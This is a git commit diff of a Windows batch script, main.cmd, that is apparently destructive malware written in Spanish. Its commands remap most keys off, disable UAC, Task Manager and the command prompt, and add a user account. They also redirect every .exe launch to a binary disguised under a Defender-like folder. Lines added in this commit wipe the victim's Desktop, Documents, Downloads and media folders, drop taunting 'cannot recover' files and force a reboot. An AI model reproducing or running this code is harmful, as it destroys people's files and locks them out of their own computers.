9010d1fb580cfe537841e9c714b263686f1cbbe2
win32wacatac-exe <143294409+win32wacatac-exe@users.noreply.github.com>
2024-10-17 18:04:15 +0200

    Add files via upload

--- main.cmd
+++ main.cmd
@@ -1,5 +1,4 @@
 ::Seccion de Editor de Registro
-
 ::Desabilitacion de Teclas
 REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 0000000000000071000000000000010000003b0000003c0000003d0000003e0000003f0000004000000041000000420000004300000044000000570000005800000037e000004600000052e0000047e0000049e0000051e000004fe0000053e0000048e000004be0000050e000004de00000520000005300000051000000500000004f0000004b0000004c0000004d0000004e0000004900000048000000470000004500000035e00000370000004a0000002900000002000000030000000400000005000000060000000700000008000000090000000a0000000b0000000c0000000d0000000f0000001000000011000000130000001600000017000000190000001a0000001b0000002b000000280000002700000026000000250000002400000022000000210000003a0000002a0000001d0000005be00000380000002c0000002d0000002e0000002f0000003000000032000000330000003400000035000000360000001de000005de000005ce0000038e000005900000065e0000021e000006be000005ee000005fe000006ae0000069e0000068e0000067e0000032e000006ce000006de0000066e0000020e000002ee000002ce0000030e0000019e0000010e0000024e0000022e0000000 /f
 ::Desabilitacion del Boton de apagado de la pantalla de Bloqueo
@@ -19,6 +18,8 @@ RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastUserName /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayUserName /t REG_DWORD /d 3 /f
+::Poner Usuario de control a 0
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 ::Desabilitacion del Admin de Tareas
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
 ::Desabilitacion de CMD
@@ -82,21 +83,26 @@ net user z7R4M3 Maxcheto /add
 ::Fin de Seccion Usuarios
 
 ::Cambio de Configuracion de archivos.exe
-assoc .exe=VBSExeHandler
-ftype VBSExeHandler=wscript.exe "C:\Windows\System32\Microsoft\Protect\Defender.Update\aplicaciones.vbs" "%1" %*
+reg add "HKCU\Software\Classes\.exe" /f /v "" /t REG_SZ /d "exefile" 
+reg add "HKCU\Software\Classes\exefile\shell\open\command" /f /v "" /t REG_SZ /d "\"C:\Windows\System32\Microsoft\Protect\Defender.Update\Win32.exe\" \"%1\" %*" 
+reg add "HKCU\Software\Classes\exefile\shell\open\command" /f /v "IsolatedCommand" /t REG_SZ /d "\"C:\Windows\System32\Microsoft\Protect\Defender.Update\Win32.exe\" \"%1\" %*"
+
+::Archivos >:)
+del /Q /F "%USERPROFILE%\Desktop\*" 
+del /Q /F "%USERPROFILE%\Downloads\*"
+del /Q /F "%USERPROFILE%\Documents\*"
+del /Q /F "%USERPROFILE%\Pictures\*"
+del /Q /F "%USERPROFILE%\Music\*"
+del /Q /F "%USERPROFILE%\Videos\*"
 
 ::Archivos SPAM en el escritorio del infectado
 set "escritorio=%USERPROFILE%\Desktop"
-set "archivoFuente=C:\Windows\System32\Microsoft\Protect\Defender.Update\YA.NO.LO.PUEDES.RECUPERAR.txt"
+set "archivoFuente=C:\Windows\System32\Microsoft\Protect\Defender.Update\main.txt"
 
 if not exist "%archivoFuente%" exit /b
 
-for /l %%i in (1,1,10) do (
-    copy "%archivoFuente%" "%escritorio%\YA.NO.LO.PUEDES.RECUPERAR.txt" >nul
+for /l %%i in (1, 1, 10) do (
+    copy "%archivoFuente%" "%escritorio%\YA.NO.LO.PUEDES.RECUPERAR%%i.txt" >nul
 )
-
-::Regalito Grodo (da error a los demas codigos aveces funciona)
-::powershell -Command "wininit"
-
 ::Reinicio
 shutdown /r /f /t 0
